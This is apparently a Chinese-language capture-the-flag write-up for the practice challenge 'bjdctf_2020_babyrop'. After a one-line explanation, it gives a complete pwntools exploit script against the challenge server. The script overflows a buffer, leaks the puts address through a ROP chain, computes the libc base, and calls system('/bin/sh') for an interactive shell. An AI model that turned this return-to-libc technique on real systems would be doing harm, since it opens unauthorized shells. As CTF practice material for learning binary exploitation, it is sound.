## bjdctf_2020_babyrop

这里这题还是和[2018-rop](./铁人三项(第五赛区)_2018_rop.md)是一样的的方法无非是多了rdi的传参

exp：

```python
from LibcSearcher import LibcSearcher
from pwn import *
context.log_level='debug'
io = remote("node5.buuoj.cn",27580)
elf = ELF("/home/fofa/bjdctf_2020_babyrop")

puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
main_addr = elf.sym['main']
offset = 0x20+8
ret_addr = 0x04004c9
rdi_ret = 0x0400733

payload = cyclic(offset)+p64(rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(main_addr)
io.recvuntil('Pull up your sword and tell me u story!')
io.sendline(payload)
puts_addr = u64(io.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
print(hex(puts_addr))

# libc = LibcSearcher('puts',puts_addr)
puts = 	0x06f690
system_offset = 0x045390
binsh_offset = 	0x18cd57
libc_base = puts_addr-puts
system = system_offset+libc_base
binsh = binsh_offset +libc_base

payload = cyclic(offset)+p64(rdi_ret)+p64(binsh)+p64(system)
io.recvuntil('Pull up your sword and tell me u story!')
io.sendline(payload)
io.interactive()
```

